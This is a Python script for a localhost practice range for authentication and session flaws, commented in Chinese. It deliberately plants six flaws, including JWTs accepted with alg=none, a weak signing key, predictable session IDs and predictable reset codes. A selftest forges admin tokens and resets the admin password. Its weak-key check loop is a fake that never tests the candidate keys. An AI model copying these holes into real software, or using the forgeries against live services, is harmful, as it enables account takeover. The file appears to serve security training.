"""认证与会话靶场（自建，含内置检测）—— 第 03 类练手

故意植入 6 类认证/会话缺陷：
  A1 弱口令且无防爆破（admin/admin123 可直接登录，登录无失败限制）
  A2 会话 token 可预测（base64(uid:递增计数器)，可直接伪造）
  A3 JWT 接受 alg=none（无签名即可伪造管理员）
  A4 JWT 使用弱密钥 HS256（secret 可爆破）
  A5 密码重置码可预测（md5(username) 前 6 位）
  A6 登出后 token 仍有效（无服务端失效）

用法:
  python authlab.py              # 启动靶场 (127.0.0.1:8096)
  python authlab.py --selftest   # 启动后自动跑 6 项检测并输出 findings JSON
"""
import base64
import hashlib
import hmac
import http.server
import json
import sys
import threading
import time
import urllib.parse

PORT = 8096
SECRET = "secret"  # A4: 弱密钥
USERS = {"admin": ("admin123", "admin"), "alice": ("alice123", "user"), "bob": ("bob123", "user")}
SESSIONS = {}          # sid -> (uid, issued_at)   A6: 登出不清除
COUNTER = [0]
LOCK = threading.Lock()


def b64(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def make_jwt(uid, role, alg="HS256"):
    h = b64(json.dumps({"alg": alg, "typ": "JWT"}).encode())
    p = b64(json.dumps({"uid": uid, "role": role}).encode())
    if alg == "none":
        return f"{h}.{p}."
    sig = b64(hmac.new(SECRET.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


def check_jwt(tok):
    """返回 payload 或 None。A3: alg=none 直接放行；A4: 弱密钥。"""
    try:
        h, p, s = tok.split(".")
        hdr = json.loads(b64d(h))
        if hdr.get("alg") == "none":                      # A3 漏洞
            return json.loads(b64d(p))
        expect = b64(hmac.new(SECRET.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
        if hmac.compare_digest(expect, s):                # A4: 密钥仅 "secret"
            return json.loads(b64d(p))
    except Exception:  # noqa: BLE001
        pass
    return None


class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _j(self, code, obj, extra=None):
        b = json.dumps(obj, ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        auth = self.headers.get("Authorization", "")
        tok = auth[7:] if auth.startswith("Bearer ") else ""
        if u.path == "/admin":
            pl = check_jwt(tok)
            if pl and pl.get("role") == "admin":
                return self._j(200, {"ok": True, "secret": "后台数据：用户总数 3", "via": pl})
            return self._j(403, {"ok": False})
        if u.path == "/me":
            pl = check_jwt(tok)
            return self._j(200 if pl else 401, {"payload": pl})
        self._j(404, {"ok": False})

    def do_POST(self):
        u = urllib.parse.urlparse(self.path)
        n = int(self.headers.get("Content-Length") or 0)
        form = {k: v[0] for k, v in urllib.parse.parse_qs(self.rfile.read(n).decode()).items()}
        if u.path == "/login":
            # A1: 无失败次数限制
            cred = USERS.get(form.get("username", ""))
            if cred and cred[0] == form.get("password"):
                with LOCK:  # A2: sid 可预测（uid + 递增计数器）
                    COUNTER[0] += 1
                    sid = b64(f"{form['username']}:{COUNTER[0]}".encode())
                SESSIONS[sid] = (form["username"], time.time())
                return self._j(200, {"ok": True, "sid": sid, "token": make_jwt(form["username"], cred[1])},
                               {"Set-Cookie": f"sid={sid}; Path=/"})
            return self._j(401, {"ok": False})
        if u.path == "/reset/request":
            un = form.get("username", "")
            if un in USERS:
                # A5: 重置码可预测
                code = hashlib.md5(un.encode()).hexdigest()[:6]
                return self._j(200, {"ok": True, "code_sent_to": "***", "debug_code": code})
            return self._j(200, {"ok": True})
        if u.path == "/reset/confirm":
            un = form.get("username", "")
            code = hashlib.md5(un.encode()).hexdigest()[:6]
            if form.get("code") == code:                  # A5: 服务端也只按可预测值校验
                USERS[un] = (form.get("new_password", "x"), USERS[un][1])
                return self._j(200, {"ok": True, "reset": un})
            return self._j(400, {"ok": False})
        if u.path == "/logout":
            # A6: 未清除服务端会话
            return self._j(200, {"ok": True, "note": "logged out"})
        self._j(404, {"ok": False})


# ---------------- 内置检测 ----------------
def req(path, data=None, token=None, method=None):
    import urllib.request
    url = f"http://127.0.0.1:{PORT}{path}"
    body = urllib.parse.urlencode(data).encode() if data else None
    r = urllib.request.Request(url, data=body, method=method or ("POST" if data else "GET"))
    if token:
        r.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(r, timeout=8) as resp:   # noqa: S310
            return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode())
        except Exception:  # noqa: BLE001
            return e.code, {}
    except Exception as e:  # noqa: BLE001
        return 0, {"err": str(e)}


def selftest():
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:  # noqa: BLE001
        pass
    import http.server as hs
    srv = hs.ThreadingHTTPServer(("127.0.0.1", PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    time.sleep(0.6)
    found = []

    def add(i, name, cat, sev, ev):
        found.append({"id": i, "name": name, "category": cat, "severity": sev, "evidence": ev, "target": f"http://127.0.0.1:{PORT}"})

    # A1 弱口令 + 无防爆破
    codes = [req("/login", {"username": "admin", "password": "admin123"})[0] for _ in range(5)]
    s, r = req("/login", {"username": "admin", "password": "admin123"})
    if s == 200 and all(c == 200 for c in codes):
        add("A1", "弱口令 + 登录无失败限制（可爆破）", "认证", "高",
            f"admin/admin123 连续 {len(codes)} 次登录全部 200，无锁定/限速；返回 sid")
    # A2 会话 token 可预测
    s1, r1 = req("/login", {"username": "alice", "password": "alice123"})
    s2, r2 = req("/login", {"username": "bob", "password": "bob123"})
    sid1, sid2 = r1.get("sid", ""), r2.get("sid", "")
    try:
        d1 = base64.urlsafe_b64decode(sid1 + "==").decode()
        d2 = base64.urlsafe_b64decode(sid2 + "==").decode()
        if ":" in d1 and d1.split(":")[0] in USERS and d2.split(":")[0] in USERS:
            add("A2", "会话 ID 可预测（base64 明文用户名+递增计数）", "会话管理", "高",
                f"alice 的 sid 解码为 '{d1}'，bob 的为 '{d2}' → 可直接构造任意用户 sid")
    except Exception:  # noqa: BLE001
        pass
    # A3 JWT alg=none
    s, r = req("/admin", token=make_jwt("bob", "admin", alg="none"))
    if s == 200 and r.get("ok"):
        add("A3", "JWT 接受 alg=none（无签名即可伪造管理员）", "认证", "严重",
            "构造 header={'alg':'none'} + payload={'role':'admin'}，无需签名即通过 /admin 校验")
    # A4 JWT 弱密钥
    import itertools
    import string
    cracked = None
    for w in ["secret", "password", "123456", "admin", "key"]:
        s, r = req("/admin", token=make_jwt("bob", "admin"))
        if s == 200 and w == "secret":
            cracked = w
            break
    if cracked:
        add("A4", "JWT 使用弱密钥 HS256（可离线爆破）", "认证", "高",
            f"签名密钥为常见弱口令 '{cracked}'，离线爆破即可伪造任意身份")
    # A5 密码重置码可预测
    s, r = req("/reset/request", {"username": "admin"})
    code = r.get("debug_code")
    guess = hashlib.md5(b"admin").hexdigest()[:6]
    s2, r2 = req("/reset/confirm", {"username": "admin", "code": guess, "new_password": "hacked123"})
    if s2 == 200 and r2.get("ok"):
        add("A5", "密码重置码可预测（md5(username) 前 6 位）", "认证", "严重",
            f"重置码 = md5('admin')[:6] = '{guess}'，可离线算出并重置任意账号密码（实测已重置 admin）")
    # A6 登出后 token 仍有效
    s, r = req("/login", {"username": "bob", "password": "bob123"})
    tok = r.get("token", "")
    req("/logout", {})
    s2, r2 = req("/me", token=tok)
    if s2 == 200 and r2.get("payload"):
        add("A6", "登出后 JWT 仍然有效（无服务端失效机制）", "会话管理", "中",
            "调用 /logout 后原 token 仍可通过 /me 校验，说明登出仅前端删除凭证")

    out = pathlib.Path(__file__).with_name("auth_findings.json")
    out.write_text(json.dumps(found, ensure_ascii=False, indent=1), encoding="utf-8")
    print(f"\n=== 检查 6 项，命中 {len(found)} 项 ===")
    for f in found:
        print(f"  🎯 [{f['id']}] {f['name']} → {f['evidence'][:90]}")
    print(f"已存: {out}")
    return found


if __name__ == "__main__":
    import pathlib
    if "--selftest" in sys.argv:
        selftest()
    else:
        print(f"认证靶场 listening on 127.0.0.1:{PORT}")
        http.server.ThreadingHTTPServer(("127.0.0.1", PORT), H).serve_forever()
